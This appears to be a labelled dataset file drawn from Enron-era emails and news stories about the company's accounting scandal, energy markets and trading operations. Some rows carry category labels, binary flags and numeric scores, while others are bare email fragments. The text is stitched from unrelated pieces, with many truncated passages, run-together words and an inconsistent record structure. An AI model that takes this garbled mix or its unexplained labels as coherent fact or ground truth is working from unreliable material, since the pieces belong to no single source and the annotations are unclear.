it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,1,"One of the primary questions under investigation is why Fastow and other Enron executives were permitted to establish complex and secretive partnerships with odd, obscure names -- LJM1, LJM2, JEDI, Chewco, the Raptor entities, Osprey, Big Doe -- that allegedly reaped these partners windfall profits while hiding Enron debt. In November, Enron had to revise its finance statements for the past four and a half years, acknowledging that the company was $600 million in net income poorer than it had led the government and its investors to believe. The Houston company also had to acknowledge an additional $2.5 billion in debt -- much of which came from these murky ""partnerships."" Recent revelations tied to the Watkins memo may result in billions more debt added to the Enron ledger. ""Someone should have stepped up and said, 'No, you can't do these sort of things!'"" said a knowledgeable former Enron employee. But for too long no one did, the employee added. And then when someone finally spoke up, it was too late. Currently, much is being made in the media of Watkins' August letter to CEO Kenneth Lay, released on Tuesday by investigators with the House Energy and Commerce Committee. ""I am incredibly nervous that we will implode in a wave of accounting scandals,"" Watkins wrote. ""The business world will consider the past successes as nothing but an elaborate accounting hoax."" But Watkins' letter, said one source, was not the only alarm being sounded within the company before it imploded. In addition to the flags raised by Watkins and Mintz, then-treasurer Jeff McMahon also aired his own growing concern. In her memo, Watkins alluded to McMahon's tribulation, writing that he ""was highly vexed over the inherent conflicts of [the] LJM [partnership]. He complained mightily to [chief executive] Jeff Skilling and laid out five steps he thought should be taken if he was to remain as treasurer. Three days later, Skilling offered him the CEO spot at Enron Industrial Markets and never addressed the five steps with him."" In the eyes of many Enron executives at the time, McMahon's new assignment was meant to silence him. McMahon ""learned about these partnerships and he thought they were wrong,"" said a knowledgeable former Enron employee. ""He thought they were a huge conflict of interest."" McMahon, according to this source, went to Skilling and said, ""'We have this problem, and I think there's a conflict.' Skilling says, 'I'll take a look at it; I'll take care of it.' And the next thing you know, he's reassigned. And it was not a promotion."" To other executives it looked like retaliation against a whistleblower, an Enron source said.",1.0,0.8,0.9,0.8

record keeping accounting practices,0,"Subject: EIM AccomplishmentsAs I look back on the ten months that I have been the Business Controller for EIM and challenged to build the mid and back office infrastructure, the most significant accomplishments are:Systems - Tactical systems have been implemented to bridge the business while strategic systems are developed. Financial and physical confirmations (with the exception of Lumber) have been predominantly automated. Financial settlements has been automated. Implemented modified versions of LISA to handle physical movements and settlements. Bridges have been built to SAP and Credit Aggregation systems.People - Ten months ago, the mid and back office had three employees, with the remaining efforts supported by Global Markets. Today, we have an enthusiastic, energetic team of 41 employees. The team includes our London office also. We continue to recruit for additional positions.Processes and Controls - Many processes and controls have been developed to ensure accurate and timely reporting of P&L and positions, confirmations and settlements. Some of these tools include:Pulp and Paper Deal Ticket (Access Database) - Ten months ago, deal tickets were generated through an Excel template and no master copy or controls were in place. Today, traders, Risk, Confirms, Settlements, Credit, Logistics, etc. can view the deal tickets in a controlled and timely manner.LISA/TAGG Reconciliation (Access Database) - When the onset of physical business and the implementation of LISA systems, physical transactions for all commodities (except lumber) are entered into 2 systems - LISA and TAGG. This tool provides a reconciliation tool that allows the Risk system and the logistics/settlements systems to stay in sync.Trader Training Tools - Two different presentations have been developed and presented to the EIM trading community to help the traders (mostly new to Enron) understand the roles and responsibilities of traders, segregation of duties and the processes within Commercial Support functions such as Credit, Tax, Legal, Operations, Logistics, etc.Sally, I hope this will give the flavor of the focused efforts. Additionally, as I have had a few hours to reflect on our conversation, I would like to follow-up with an additional meeting. I need just a bit more clarity around the EIM role, but more so, I want to move forward to discuss the new role and in your view, how I can still accomplish the successes that coincide with my personal goals.If you have time tomorrow afternonn, I would really appreciate 30 minutes.Thanks for your support.

because we got sick of it and had other ""fish to fry"" in Asia and Africa ,

That fact that you asked ""who?"" begs the further question of what exactly you 
were up to in Houston.  Have the Brits ever really won a battle any way?  
(Their failure to beat a bunch of colonized farmers with pitch forks has 
resulted directly in this Florida mess, and their failure to put away the 
French (of all people) has resulted directly in me and the vast majority of 
my fellow Canadians being subjected to official and legally mandated 
bilingualism).

To the point, I believe San Felipe is the battle field adjacent to the 
Westheimer battle field, where the Brits (or at least one of them) were 
purportedly waging a more efficient war, until being caught red handed on the 
battle fields of San Felipe, where, all the while, the Canadian forces (or at 
least one of them) were so successfully conquering the enemy.

record keeping accounting practices,0,"The significance of special charges -- whether they represent old baggage from the past or illuminate the future -- is at the center of a lively debate under way in the accounting world. One side holds that generally accepted accounting principles, or GAAP, provide the best available snapshot of a company's financial position. GAAP, which companies must use in their official financial statements, requires that nearly all charges be treated as ordinary expenses. Others, including many stock analysts, contend the best view comes from ""pro forma"" financial results -- calculated ""as if"" many expenses didn't really exist. The idea is that these expenses aren't relevant to future performance. Companies increasingly highlight the pro forma view in news releases they generally put out before their official filings with regulators. But pro forma calculations adhere to no particular standard. Companies essentially do what they want. Now, accountants and economists say the practice of excluding blemishes is so widespread that companies and analysts often guide investors to dismiss charges that contain prescient warnings -- like the one at Bethlehem Steel. Ms. Applebaum, the Salomon Smith Barney analyst who played down Bethlehem's big write-off, explains that she has covered other steel companies that returned to profitability shortly after writing off deferred tax assets. She thought Bethlehem would do the same. She notes that GAAP rules on such assets obliged Bethlehem to follow strict criteria in assessing its chances of future profitability -- stricter criteria than stock analysts typically use. As for Bethlehem, Chief Financial Officer Leonard M. Anthony says the charge the company took was to some extent ""predictive of the future."" GAAP also has well-established standards for writing down other kinds of assets. Companies must reduce the value on their books of anything from a customer loan to a manufacturing plant when its worth has diminished. Again, Wall Street stock analysts tend to dismiss the resulting charges as one-time events. Sometimes that makes sense. During the 1981-82 recession, restructuring was a part of many corporations' strategies. They took charges for streamlining, outsourcing and otherwise shedding costs to position themselves for recovery. Because the resulting earnings volatility made it hard to compare companies' growth rates or price-earnings ratios, and because the charges weren't expected to recur, there was logic to excluding them to come up with ""smoothed"" earnings trends. ""Investors came to look upon the charges, correctly in many cases, as evidence that those firms had recognized past mistakes and had made tough decisions to become more efficient,"" said a September 2001 study by the Jerome Levy Economics Institute at Bard College in Annandale-on-Hudson, N.Y.",0.0,0.0,0.7,0.2

Only one group of true believers remains: the people who worked there and just got burned there.They may be in a minority. After all, 5,600 people have been thrown out of work in the midst of a recession. Most employees lost a huge part of their retirement savings as the value of their Enron stock evaporated. Many are furious at what they view as bungling or worse by top management.Even so, a surprising number of former employees lament the end of an entrepreneurial culture that more closely resembled a start-up than a Fortune 100 behemoth. That culture encouraged creativity and rewarded new ideas that worked, they say, even though its dark side, an almost manic drive to experiment with new methods and conquer new markets, resulted in its downfall. Where, they wonder, can they go from here?""Innovative is a clich?, but that's what Enron was,"" Brandon Rigney, who operated the company's Web site, said on Thursday. ""This is four days gone from the place, and I'm already in withdrawal.""Enron, which began as a gas pipeline company and transformed itself into the world's largest energy trader in the 1990's, created an associate analysts program modeled after Wall Street investment banks. Each year, it tapped 450 college graduates, half of them M.B.A.'s, to spend three years in rotating jobs at all parts of its empire.It also gave workers opportunities to start new business units. The company's energy trading platform, Enron Online, was created a few years ago by a 29-year-old gas trader. It quickly became one of the most profitable divisions.In recent years, the company came to be dominated by young people like Jeff Shankman, a Wharton School graduate who joined the company at 24. By age 34, he had become president and chief operating officer of Enron Global Markets.Mr. Shankman, who has just left the company, said Enron was special because it ""didn't have a corporate hierarchy to encumber creativity.""Management experts like Gary Hamel praised Enron for breaking with convention and turning regular employees like the 29-year-old gas trader into corporate entrepreneurs. And Fortune magazine named it America's most innovative company for six consecutive years. The corporate makeover was largely the work of Jeffrey K.

Are we determined how we should deal with imbalances (part of cost of power)? [Fairley, David] There are three considerations on this: (1) who wears imbalance exposure?, (2) who manages imbalances (hourly type activity), and (3) who pays for imbalances? Imbalances are billed by Entergy directly to MDEA under their Network Services Agreement. EPMI's hourly desk manages the load/resource items hourly, but MDEA has the exposure (physical and price) to imbalances. Weather/load changes, and fluctuations in supply create hourly imbalances (they happen, they are uncontrollable, and we fix them) which EPMI's hourly desk manages as part of the imbalance service described in the definitions and obligations of the parties. A different section in the contract states that MDEA wears the exposure. How are we setting the bogey? Formula?

Both parties participate by providing certain necessary info and discussing results and planning the day's activities.

Bob, we have to move fast -- we have to be prepared to file within a few hours of any CPUC action.  Believe me, chaos will begin if the CPUC votes for retroactive DA suspension

Others,
Given Bob's request, please do not circulate to any more of our customers until further notice.

Subject:	Preparing for Legal Action against a retroactive DA suspension


As of this point in time, the CPUC is NOT expected to vote tomorrow. The CPUC has not said when a new meeting would be held.  Although we continue to keep the pressure on, the CPUC vote could be for DA suspension as of July 1.  We need to be prepared to take immediate legal action in that event.  Here is the plan and what we'd like from customers.

Within a few hours of a CPUC vote, we plan to file at the CPUC for an emergency stay and request for rehearing. As part of that filing, we would need to include all of  the points we would raise in the court and declarations from each individual aggrieved party.   The decalarations would be held completely confidential by the attorney, transmitted directly through our outside attorney and would be filed under protective seal at the Commission.  The attorneys are preparing a pro-forma declaration that each party can use to prepare their own. I will e-mail that as soon as I have it. The draft court case is attached.  It will form the basis for our CPUC filing.
We would expect the CPUC to ignore the filing.  If the Commission failed to act on our request by the next regularly scheduled meeting, we would file in court immediately. We would use the same declarations and much of the same filing info in the court case.

Byers fines will boost renewable energy 
TERRY MACALISTER AND PAUL BROWN

The Guardian

Electricity companies will face hefty fines for failing to meet environmental 
targets under proposals to be outlined today by the industry secretary, 
Stephen Byers.

He will delight the green lobby by ruling out waste incineration from his 
definition of ""renewables"" and by putting the emphasis on new forms of energy 
such as wind power. 

An early consultation docu ment suggested a ""buyout"" fee of 2p per 
kilowatt-hour for those who failed to buy 5% of their supplies from renewable 
sources by 2003 and 10% by 2010. Well-placed sources say Mr Byers has 
privately accepted the need to charge a ""buyout"" fee of 3p per kilowatt hour, 
which will anger the electricity companies but please the renewable industry.

""We anticipate this will kickstart our sector, lead to over pounds 5bn worth 
of capital investment and create thousands of jobs,"" said one executive from 
a renewable energy company.

Big companies such as National Wind Power, a division of Innogy (formerly 
National Power) and PowerGen Renewables will be among the beneficiaries.

Stephen Tindale, chief policy adviser to Greenpeace UK, said dropping 
incineration would put the government ""back on the right trajectory after a 
series of disappointments"". But the green lobby admits that further financial 
help might be needed and say electricity companies will pass on some of their 
extra costs to consumers.

The Department of Environment has had a target of 10% of electricity from 
renewables by 2010 for more than two years as part of the government's 
manifesto pledge to reduce carbon dioxide emissions by 20% by the same date. 
But deregulation has forced the price of electricity down, helping gas-fired 
power stations but penalising the less competitive renewable sector.

RANDOM,0,"Subject: Potential Dynegy Transactions

Steve,
 
I think you may have heard a request last week re working closely with Dynegy.  I think we just need to treat them like other counterparties.  Basically, West Power would like to enter into arms length physical power and service transactions with Dynegy.  My understanding is that Dynegy is a separate, unrelated party until the merger closes.  Therefore, we can not ""collaborate"" with them commercially and our transaction policy is dictated by customary credit, legal and risk management procedures.  Is this correct?   If so, how do you feel about the following?
 
An Enron customer wants to buy power and related services for one year.  The customer requires Enron to post collateral.  Enron does not want to post collateral but suggests that Enron can provide the product/services to Dynegy and Dynegy can then sell to the customer.  The Enron marketer calls the Dynegy marketer and proposes a ""back to back"" transaction.   Dynegy adds a small service fee, the Enron/Dynegy contract is executed and a Dynegy/Customer contract is executed.  
 
This type of deal happens frequently - it is usually driven by the third party having better credit, transmission access or a complementary service.  We could do this with anyone, but the obvious choice is Dynegy - customers think it makes sense, and ultimately if we merge we have retained a customer.  
 
Do you think this works?

Thousands of e-mails and other files that might haveshed some light on the events leading up to Enron's bankruptcy were lost,according to reports. Andersen said that some employees destroyed theEnron files before the SEC began its investigation. A Senate panel hasissued subpoenas for documents from Enron, Andersen and 49 current andformer officers and directors. Andersen is the subject of a Congressionalinvestigation, a federal criminal inquiry and lawsuits from shareholdersthat may cost it billions of dollars. There has been speculation thatAndersen is considering a merger with another member of the Big 5accounting firms to prevent its collapse. According to reports, Andersensupervisors repeatedly reminded employees of the memo prior to theissuance of subpoenas by the SEC. Enron paid Andersen $25 million lastyear for its audit and $27 million for consulting fees and other matters.In addition, Enron's chief accounting officer and its CFO previouslyworked for Andersen. Last year Andersen settled a lawsuit over itsaccounting work, which was brought by shareholders of Sunbeam, for $110million. It also agreed to a $20 million settlement in a class-actionlawsuit stemming from its audit of trash company Waste Management.------------------------------------------------------------- Progas Storage Services, IncWas recently organized to offer specialized natural gas storage servicesto marketers and end users servicing the upper Midwest and Northeastmarket regions along the major transmission systems in Indiana, Illinois,Kentucky, and Michigan.

Natural Gas Futures Driven Lower by Lack of Fundamentals


    Natural gas for February delivery on the NYMEX tumbled $0.13 to $2.106
per MMBtu yesterday on mild weather and a continuing huge storage
inventory. The March contract lost $0.118 to $2.118 per MMBtu. Contracts
were in contango with each succeeding month more expensive than the prior
month. There's a lack of support across the board. Cash prices will likely
weaken more by the weekend ahead of next Tuesday's February contract
expiration with forecasts again predicting above normal temperatures for
the next two weeks across most of the nation. A general lack of
fundamentals and technical weakness should pressure the market below $2
soon. This week's AGA storage report is expected to show a 130 - 140 Bcf
withdrawal. Anything less and the market could looking at $1.70 per MMBtu
by expiration. As storage operators face requirements to release volumes
out of storage, that extra gas hitting the market could force prices down
quickly. Natural gas for next day delivery across the US and Canada was
generally $0.20 - $0.40 lower yesterday. Natural gas for next day delivery
at the Henry hub lost $0.23 to $2.18 per MMBtu.

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,1,"Bad trading. Enron's main technique to pump up earnings probably revolvedaround a loose-as-a-goose process for the accounting of energy derivatives.Called mark-to-market, the technique involves evaluating contracts at ""fairvalue"" prices. Since some of these contracts stretched out for 20 years, thefutures market provides no firm prices. And, absent a liquid market withclear prices, ""fair value"" becomes a mug's game in which companies canvastly inflate value. These overstated gains, of course, were also unrealized, noncash gains. InSeptember 2000, Jonathan Weil, a reporter for the Journal, took a look atEnron's second quarter and found that absent noncash earnings, Enron wouldhave had a loss. Mr. Weil later found that for the year as a whole,unrealized trading gains accounted for more than half of the company'soriginally reported pretax profits. Hardly a confidence-builder in thequality of Enron's earnings.When their derivative strategies started to go sour, this theory runs, Enronremoved the contracts from its financial statements and hid them in specialentities created for just that purpose.Bad Assets. Another theory locates Enron's earning problems in their hardassets. Enron had a bunch of huge and underperforming assets, like itsbroadband company, water company and power plants in India and Brazil. Inorder to hustle those assets and associated debts off its financial reports,the company created some limited partnerships to buy these dogs -- eitherwith bank loans or money provided by Enron itself. These partnerships(allegedly) transferred enough control to third parties to get them offEnron's balance sheet. Enron guaranteed these deals with ""make good"" provisions backed by Enronstock -- a promise that Enron would make good any losses in the value of thepartnerships. When the value of the assets tanked, the make-good provisionskicked in, resulting, for example, in the enormous write-down in shareholderequity in November.Depending on which theory one accepts, there are two bottom lines.The first holds that the sagging earnings problem was fatal and that it isentirely possible Enron was in the process of liquidating itself. Jim Chanosof Kynikos Associates hypothesizes that Enron's cost of capital was higherthan its returns on invested capital. A second argues that if Enron'smanagers had been content to accept the fact that in competitive marketstheir ""first mover"" advantage was going to be competed away, and had beenwilling to endure slower earnings growth, it would not be in bankruptcytoday.",1.0,0.8,0.8,0.8

Louise,

I understand that there's a lot of discussion going on about the approach to organizing our technical resources.  I would appreciate the opportunity to provide input to that process.

You don't know much about me, but I have been with Enron for over eleven years.  I was hired Enron Power Corp. as Project Engineering Manager for the Teesside project, was promoted to General Manager of Engineering concurrently with being Teesside PEM, and built up the engineering group there.  I moved into front end development support and have worked on development projects in Mexico, South America, the Middle East and Europe.  A little over three years ago I was assigned to support ENA efforts and I was intimately involved in the 99 peakers on.  Last November I transitioned my EE&CC development engineering group from EE&CC to ENA as part of the Technical Services group.

All of the above is only to say that I have pretty broad exposure to the overall organization.  I know a lot of the people, a lot of the history and I a little about how this machine seems to work.  I would be happy to give my perspective on the issues if it is any value to you.  Although I should provide truth in advertising and warn you that I am pretty direct and have fairly definitive opinions on most subjects.  In other words, my opinion is way too easy to get.

If I can add anything to the process, please let me know.

He resigned as president and chief executive from Enron on Aug. 14, 2001, citing personal reasons. 
Skilling, along with former Enron Chief Financial Officer Andrew Fastow and Chief Accounting Officer Richard Causey, are slated to go before the House Energy and Commerce subcommittee on oversight and investigations on Thursday. 
Rep. Billy Tauzin, chairman of the full Energy and Commerce Committee, said on Sunday he expected Fastow and another former Enron executive, Michael Kopper, to invoke their Fifth Amendment rights not to testify at the hearing. 
Former Enron Chairman Kenneth Lay abruptly canceled his planned appearances before a Senate Commerce subcommittee on Monday and House Financial Services hearing on Tuesday because of what his lawyer described as a prosecutorial atmosphere in Congress. 
That decision also followed the release of a damaging report over the weekend by a special committee of Enron's board of directors that blasted Lay for his lack of oversight.

Former Enron chief Kenneth Lay appears to have substantial assets at his disposal

HOUSTON (AP) - If former Enron Corp. chief executive Kenneth Lay is fighting to stave off personal bankruptcy, as his wife says, he appears to have a lot of assets at his disposal. 
Two Houston homes and four adjoining apartments in the city have a combined value of $1.1 million. Three beachfront homes and two lots on the west end of Galveston are valued at a combined $1.7 million. Four properties in exclusive Aspen, Colo., could fetch more than $19 million.
Linda Lay said last week on NBC's ""Today"" show that she and her husband lost their fortune when Enron crashed because most of it was tied up in shares now each worth less than a cup of coffee. 
She said all their homes are up for sale except the $7.1 million 33rd floor of one of Houston's most exclusive high-rises. 
""We're fighting for liquidity,"" she said. 
But if the Houston and Galveston properties are on the market, many real estate agents do not know about it. 
A red-brick two-story house in Houston, formerly owned by the Lays and valued at $259,300, was sold within the past two months. But the two other homes and four adjoining apartments do not have for-sale sig",0.0,0.0,0.7,0.2

Mark Taylor and I haven't spoken yet about simplifying the language in the

we're staying with the existing language which isn't really that bad.

Any of these products which are intra-month will stay in the swap filter as 
US GAS DAILY products, but longer than intra-month will be in the basis

I suspect he is working on the Enron book right now.---schIs Enron the New Drexel? By Michael Lewis, the author of ``Liar's Poker'' and ``The New New Thing.''Berkeley, California, Dec. 20 (Bloomberg) -- Enron Corp. is rapidly expanding the American business journalists' notion of what is possible: No story can ever again be said to be too outrageous to be true. The boss, Kenneth Lay, was a friend of the current president of these United States, an adviser to his administration and one of his biggest financial backers. The company itself was rated ``strong buy'' by analysts at almost every Wall Street firm, considered a shining example of modern accounting by reputable accounting firms, and plugged endlessly by the business press. Six years running as Fortune's most innovative company! And all the while this same operation was, at the very top, a lie. Understandably, people long for some analogy to help them grasp this situation, but really there isn't a good one. Other than failed hedge fund Long-Term Capital Management, Michael Milken's junk bond department at Drexel Burnham Lambert offers the closest parallels on Wall Street, and several people have written to me over the past week to suggest it. But it really is unfair to Milken to compare him to Lay. Alumni Will Flourish True, in both cases profitable trading businesses collapsed because their creditors came to distrust the people who ran them. And in both cases the core business -- Drexel's junk bonds and Enron's energy trading -- remain viable in the hands of other companies that banks trust. Just as the Drexel junk bond traders who didn't go to jail went to other Wall Street firms and created replicas of their former business, former Enron traders will soon be making lots of money for one-time rivals such as Dynegy Inc. and Duke Energy Corp. Well before Kenneth Lay emerges from his legal hell, the energy trading business will return to normal. But the morality of the cases are entirely different. Whatever you think of Milken's junk bond department -- and I think its sins were minor beside its achievements -- you must admit the people in it exhibited a certain honor among thieves. There was never a moment when Milken betrayed the broad interests of his traders for his own narrow ones. He paid himself huge sums of money, but he also made huge sums for his firm. He was careful to watch out for the little people who worked for him, and they loved him for it. The Enron bosses, by contrast, pillaged their firm and left the little people who worked for them holding the bag. Different Motivations",0.0,0.0,0.9,0.6

million bpd in a bid to lift sagging crude prices. To avoid losing 
market share, the cartel had demanded that non-OPEC producers 
contribute a cut of 500,000 bpd between them before it would make any 
further slices in its own production. So far, Russia, Mexico, Norway, 
Oman and Angola have committed to a combined 462,500 curb in exports, 
which appears to be enough to allow OPEC to go ahead with their 
plans. The ministers are scheduled to meet in Cairo on Friday and are 
expected to take that opportunity to announce their cut. The IEA 
projects that world demand will rise by 600,000 bpd next year, about 
30% below the average annual gain during the 1990's, as the largest 
oil consumers, the US and Japan are mired in a recession. The CFTC 
has reported that traders sold more crude oil futures contracts on 
the NYMEX than they bought in the week ended December 18th, producing 
the highest net short position levels since the contracts began 
trading in 1983. Heating oil futures for January delivery on the 
NYMEX jumped $0.0462, or 8.4%, to $0.5946 per gallon as colder 
weather arrived in most of the eastern portion of the US. The 
increase in heating oil was the biggest gain since last April.

Rosenthal said a current Tax Courtcase involves the Internal Revenue Service disputing a company's use of a""credit adjustment"" to reduce income.Price said the rules allow companies to elect to use ""hedgeaccounting."" He said a company which recognized gain or loss from aderivative identified as a hedge could have an offsetting gain or loss fromthe item being hedged. Thus, hedge accounting reduces the volatility createdby FAS 133 for companies that hedge their risk. However, FAS 133 contains astrict definition for a hedge, and an item could lose its character as ahedge because the definition is reapplied every quarter to the same item.The panelists noted that for tax purposes, once an item is considered ahedge, its character would not change subsequently.Price said the new FASB rule applies to entities that reportto the Securities Exchange Commission and are effective for fiscal yearsbeginning after June 15, 2000, and Jan. 1, 2001, for companies reporting ona calendar year.Ops Execs See Raised ProfileOperations Management - November 27, 2000Operations and technology executives are taking on a larger role withinfirms and ate receiving more senior job titles as a result, according to aRussell Reynolds Associates study to be released this week.

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,0,"SWAPS THAT SWEAT IT OUT: The derivatives markets can be especially valuable as an early-warning signal -- particularly the credit-default swap market, where institutional investors seek financial protection against corporate bankruptcies. The default swap market is probably the most sensitive measure of how market participants view corporate prospects. For example, the credit-derivatives market was far ahead of the rating agencies in suggesting that once-mighty energy trader Enron was a weak credit. Weeks before the Houston company sought bankruptcy-court protection, pricing on Enron protection was far more expensive than it should have been, given Enron's then investment-grade rating. Essentially, these credit swaps are a form of insurance on Enron debt; if Enron defaults, the buyer of such a swap goes to the seller of the swap and receives 100 cents on the dollar, regardless of how worthless the debt may have become. In September, shortly after Enron Chief Executive Jeffrey Skilling stepped down, there was a drastic increase in Enron credit-default swap volumes, and spreads doubled on Enron risk to a steep 2.75 percentage points over the London Interbank Offered Rate, the short-term rate off which banks price some loans. By October, with the announcement that the Securities and Exchange Commission was investigating Enron's financial statements for accounting irregularities, spreads doubled again, to more than five percentage points. Then, after Enron lost access to the commercial-paper market, spreads rose to an almost prohibitively expensive 15 percentage points, according to data from KMV LLC, a credit-risk-management service in San Francisco. Meanwhile, the shares edged down to $13 from $37 during the course of the month, levels that didn't hint at the fate that would overtake Enron just a few weeks later. Indeed, the shares didn't drop below $1 until Nov. 28, from above $4 on Nov. 27. (Unfortunately, there isn't a market for many corporate names below investment grade, unless, like Enron, they plunge rapidly into junk territory.) DEBT THAT DIVES IN VALUE: Often the secondary bond market can provide valuable clues about a troubled company's fate, as bond analysts are much more focused on a company's ability to repay its debts. They scour information pertinent to the sort of distress that leads to a filing. Henry Miller, vice chairman of Dresdner Kleinwort Wasserstein, an investment-banking and advisory boutique, has worked out a formula as follows. ""When the bonds start trading between 90 cents and 80 cents on the dollar, a light bulb goes on,"" he says. ""When the bonds then fall to between 60 cents and 80 cents, that tells you that somebody is nervous. And when they start trading between 40 cents and 60 cents, it is a question of when, not whether. And when they go below 40 cents, a filing is -- to varying degrees -- imminent.""",0.0,0.0,0.9,0.0

In an effort to get cash in the door for TW and to maximize revenue opportunity for TW in the coming year, I think we should look at getting two proposals on file with the FERC as soon as possible. 

One would be the OBA filing we have been discussing (and trying to support with historical data) to get automatic cash-out on OBA's in ""constrained"" areas on TW.

Second would be to look at filing for scheduling by price at alternate FT points.  This may be the time (the market to California is not so hot) to try to implement this.  I know we will have to look hard at the cost of the system modifications required and whether we can justify them.  

Glen is already scheduling a meeting next week for further discussion of the OBA tariff filing.  Could we discuss scheduling alternate FT by price at the same meeting?",0.0,0.0,0.5,0.0

Curves disinverting in both gilts & swaps led by the long end on various
stories in the mkt, most mentioned is maybe the potential for reforms of
annuities, while rumours have been around for a long time, word is building
that in the pre budget report there may be a plan to get rid of this. This
might also explain the delay of the 2025's tap until the week after the
report. Swap spreads broadly unchanged, 10-30's swaps disinverted 3.5bps,
with 2-10's swaps unch. UK swap spreads are also increasingly becoming a
topic for discussion at these lvls, while we do feel we are starting to
reach a support lvl in long end swap spreads, we dont see these levels as an
obvious widening opportunity. Generally we do feel that further downside
over the coming months in 30yr spreads is probably limited to maybe 5bps or
so, and on that basis, it is worth keeping an eye on these and maybe looking
to start averaging in soon, but its not clear that the narrowing flows of
the last few months are definitely over for the year & while offside risk
already in the trade is not significant compared to other flows in the mkt,
its certainly out there potentially making this a little crowded going fwd.

The Danish election yesterday saw the largest swing since 1968 and reduced
the ruling Social Democrats to the second largest party only for the first
time in 75 years. The new prime minister will be the leader of the Liberals,
Anders Fogh Rasmussen. Together with the Conservatives, the Liberals will
begin the work of forming a new government. But this is likely to be a
fragile minority government, dependent on shifting coalition partners. The
Liberals had hoped to count on the support of the EU-friendly
Centre-Democrats but the latter failed to pass the 2% threshold for
parliamentary representation. Instead, the right wing Danish Peoples Party
emerged to become the third largest party - doubling its mandate.  Fogh
Rasmussen is going to have a tough job in conquering the middle ground.

The market bid blue chips higher, but cashed in recent gains in the battered tech sector. Although big-name companies reported fourth-quarter results largely in line with expectations, analysts said investors kept their focus on forecasts for 2001.""Fourth-quarter earnings have really left the radar screen for most investors,"" said Richard E. Cripps, chief market strategist for Legg Mason of Baltimore. The Dow Jones industrial made a solid advance, closing up 82.55 at 10,729.52. Broader market indexes declined. The Nasdaq composite index fell 104.87 to 2,754.28, and the broader Standard & Poor's 500 index slipped 6.79 to 1,357.51. The market is so focused on corporate performance during the first half of this year that even Federal Reserve Chairman Alan Greenspan failed to move stock prices. Greenspan testified before Congress, speaking mostly about longer-term tax cuts but also signaling that interest rates are likely to drop further. While investors are cautious, the mood on Wall Street is slightly more upbeat than in recent months, analysts said. The market is hopeful that earnings and the economy will soon improve, particularly as interest rates decline. The Fed is expected to cut rates for the second time this month when it meets next week. That expectation factored into some of yesterday's tech sector selling, said Cripps of Legg Mason. ""There's some gamesmanship going on in advance of the Fed meeting,"" Cripps said, noting that investors who have been buying on expectations of a rate cut are likely to sell if and when the Fed takes that action. Dell, which earlier in the week rebounded from a poor first- quarter earnings outlook, lost 69 cents to close at $26.44. Computer equipment maker EMC fell $2.94 to $76.50 after rising earlier in the week on earnings that were 2 cents a share higher than expectations. While past earnings are important, the market typically is most concerned about companies' future profitability. That was evident yesterday in a sharp decline among companies that make fiber optic and other networking equipment. Corning skidded nearly 20 percent, finishing down $13.88 at $56.25. The maker of fiber optic cables warned late Wednesday that its customers had cut back their orders through the first half of the year. ""People are spooked by the guidance given by Corning"" said Charles White, portfolio manager for Avatar Associates. JDS Uniphase, which tumbled $7.88 to $55.19, recouped 74 cents in extended-hours trading. The fiber optic maker announced after the market closed that it beat second-quarter predictions by 2 cents a share.

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,1,"Congressional investigators reportedly have an October 3, 2000 videotape in which former CEO Jeffrey Skilling vigorously defends Enron's accounting methods and touts the partnership deals now linked to its collapse. The tape raises questions about Skilling's recent testimony to lawmakers in which he said he knew of nothing wrong with Enron's finances when he resigned last August, citing personal reasons. In a transcript of the tape, Skilling responds to an Enron employee's concern about a Wall Street Journal article. The September 20, 2000 story discussed Enron's use of an accounting method that books long-term contracts as current income. The article also said Enron would have had a 2nd quarter loss if not for $747 million in unrealized gains from risk management activities. However, Skilling says the story is just totally without merit, adding that Enron's accounting is conservative and the company provides more data in its annual report than anyone in a transaction-based industry. He then concludes that the company is in a strong position from an accounting basis. During the same meeting, Skilling tells employees the company will be bringing in partners to help Enron leverage its capital in its new Enron Net Works division. Earlier this month in testimony before the House Energy and Commerce Committee, Skilling said he was not aware of any inappropriate financing arrangements designed to conceal liabilities, or overstate earnings. Skilling is likely to be asked again about Enron's partnerships at the Senate consumer affairs subcommittee hearing today. He is also likely to be questioned about other discrepancies congressional investigators have found since he testified before the House committee. Also testifying will be Jeffrey McMahon, Enron's new president, and Sherron Watkins. -------------------------------------------------------------POWER FUTURES ?| Month | COB | Change | PV | Change || MAR | 20.00 | +0.00 | 22.50 | +0.00 || APR | 20.25 | +0.00 | 24.00 | +0.00 || MAY | 19.75 | +0.00 | 25.00 | +0.00 || JUN | 21.00 | +0.00 | 28.50 | +0.00 || JUL | 28.75 | +0.50 | 39.75 | +0.00 || AUG | 37.50 | +0.00 | 45.25 | +0.00 || SEP | 33.50 | +0.00 | 34.50 | +0.00 || OCT | 29.50 | +0.00 | 29.50 | +0.00 || NOV | 29.00 | +0.00 | 28.50 | +0.00 || DEC | 30.50 | +0.00 | 29.00 | +0.00 || JAN | 30.50 | +0.00 | 29.50 | +0.00 || FEB | 29.00 | +0.00 | 29.00 | +0.00 || Month | Entergy | Change | Cinergy | Change || MAR | 20.00 | +0.00 | 21.10 | +0.00 || APR | 20.00 | +0.00 | 21.60 | +0.00 || MAY | 22.50 | +0.00 | 24.70 | +0.00 || JUN | 27.50 | +0.00 | 30.00 | +0.00 || JUL | 34.50 | +0.00 | 38.25 | +0.00 || AUG | 34.50 | +0.00 | 38.25 | +0.00 || SEP | 21.50 | +0.00 | 22.90 | +0.00 || OCT | 21.85 | +0.00 | 22.90 | +0.00 |",0.5,0.3,0.5,0.2

ENA Legal.  As you will note
on the agenda attached below, we have placed the Legal Department at the top 
of the agenda after the 
introduction to discuss ""Legal Implications of the Electronic Marketplace"".

This discussion should conceivably include discussions of the following 
topics:  

Electronic signatures (in particular EnronOnline)
Websites for delivery and executing confirmations (Commodity Logic)
See ""XIII Future Trends"" on Page 4 of the agenda

Please let me know as soon as possible if this will be possible.  As you can 
see, this is a very important
topic for us.  Call me if I can help clarify any points.  

One other point - I am assuming that you guys are the head guys for financial 
and physical legal decision 
making for Houston, Calgary and London.   For your information, there may be 
some lawyer types coming from the London
Global Markets group.

Also, JAD means Joint Accelerated Development.

Wednesday's AGA inventory report, delayed more than 20 minutes due to a

most industry estimates, the 158-bcf draw seen a year ago, and the five-year
average decline of 102 bcf.  Total U.S. inventories stood at 3.061 tcf, 948

